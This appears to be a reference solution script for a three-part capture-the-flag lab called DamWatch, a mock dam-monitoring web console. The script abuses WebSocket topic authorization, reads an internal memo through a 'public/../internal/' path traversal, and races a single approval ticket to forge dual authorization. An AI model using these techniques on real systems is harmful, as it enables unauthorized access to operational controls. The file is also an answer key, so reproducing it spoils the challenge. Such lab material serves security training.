"""Reference solve for the three DamWatch flags."""

import json
import sys
import time
from concurrent.futures import ThreadPoolExecutor
from threading import Barrier
from urllib.parse import urlsplit

import httpx
from websockets.sync.client import connect


def require(response: httpx.Response, part: int) -> dict:
    if not response.is_success:
        raise RuntimeError(
            f"Part {part}: HTTP {response.status_code} from {response.request.url.path}"
        )
    return response.json()


def solve_part_1(client: httpx.Client, base_url: str) -> tuple[str, str]:
    opening = client.get("/")
    if not opening.is_success:
        raise RuntimeError(
            f"Part 1: opening the console returned HTTP {opening.status_code}"
        )
    cookie = client.cookies.get("damwatch_session")
    if not cookie:
        raise RuntimeError("Part 1: no observer cookie was issued")
    parsed = urlsplit(base_url)
    ws_scheme = "wss" if parsed.scheme == "https" else "ws"
    with connect(
        f"{ws_scheme}://{parsed.netloc}/ws/telemetry",
        additional_headers={"Cookie": f"damwatch_session={cookie}"},
        open_timeout=10,
    ) as socket:
        socket.send(json.dumps({"action": "subscribe", "topic": "operations/triage"}))
        incident = json.loads(socket.recv(timeout=10))
    if (
        incident.get("topic") != "operations/triage"
        or not incident.get("flag")
        or not incident.get("memo")
    ):
        raise RuntimeError("Part 1: restricted incident was not returned")
    return incident["flag"], incident["memo"]


def solve_part_2(client: httpx.Client, memo: str) -> str:
    reports = require(client.get("/api/archive/public"), 2)["reports"]
    if not any(report["path"].startswith("public/") for report in reports):
        raise RuntimeError("Part 2: public archive path shape is missing")
    if "/" in memo or "\\" in memo:
        raise RuntimeError("Part 2: incident memo name is invalid")
    report = require(
        client.get("/api/archive/read", params={"path": f"public/../internal/{memo}"}),
        2,
    )
    body = report.get("body", "")
    marker = "Inspector's evidence mark: "
    if marker not in body:
        raise RuntimeError("Part 2: evidence mark was not found in the memo")
    return body.split(marker, 1)[1].splitlines()[0].strip()


def solve_part_3(client: httpx.Client) -> str:
    last_result = "no approval attempt completed"
    for attempt in range(3):
        ticket = require(client.get("/api/override/state"), 3)["ticket"]
        start = Barrier(2)

        def redeem(
            slot: str, current_ticket: str = ticket, gate: Barrier = start
        ) -> httpx.Response:
            gate.wait(timeout=5)
            return client.post(
                "/api/approvals/redeem", json={"ticket": current_ticket, "slot": slot}
            )

        with ThreadPoolExecutor(max_workers=2) as pool:
            a = pool.submit(redeem, "A")
            b = pool.submit(redeem, "B")
            results = (a.result(timeout=15), b.result(timeout=15))
        if all(response.is_success for response in results):
            receipts = {
                slot: response.json()["receipt"]
                for slot, response in zip(("A", "B"), results)
            }
            authorized = client.post(
                "/api/override/authorize", json={"receipts": receipts}
            )
            if authorized.is_success and authorized.json().get("flag"):
                return authorized.json()["flag"]
            last_result = f"authorization returned HTTP {authorized.status_code}"
        else:
            last_result = "redemptions returned HTTP " + "/".join(
                str(response.status_code) for response in results
            )
        if attempt < 2:
            reset = client.post("/api/approvals/reset")
            if reset.status_code == 409:
                time.sleep(2)
                reset = client.post("/api/approvals/reset")
            require(reset, 3)
    raise RuntimeError(f"Part 3: {last_result} after three attempts")


def main() -> int:
    if len(sys.argv) != 2:
        print("Usage: solve.py <http(s)://host>", file=sys.stderr)
        return 2
    base_url = sys.argv[1].rstrip("/")
    if urlsplit(base_url).scheme not in ("http", "https"):
        print("Part 1: URL must use HTTP or HTTPS", file=sys.stderr)
        return 2
    try:
        with httpx.Client(base_url=base_url, timeout=10) as client:
            try:
                flag_1, memo = solve_part_1(client, base_url)
            except Exception as error:
                raise RuntimeError(f"Part 1: {error}") from error
            try:
                flag_2 = solve_part_2(client, memo)
            except Exception as error:
                raise RuntimeError(f"Part 2: {error}") from error
            try:
                flag_3 = solve_part_3(client)
            except Exception as error:
                raise RuntimeError(f"Part 3: {error}") from error
    except (httpx.HTTPError, OSError, ValueError, RuntimeError, TimeoutError) as error:
        print(str(error), file=sys.stderr)
        return 1
    for part, flag in enumerate((flag_1, flag_2, flag_3), 1):
        print(f"Part {part}: {flag}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
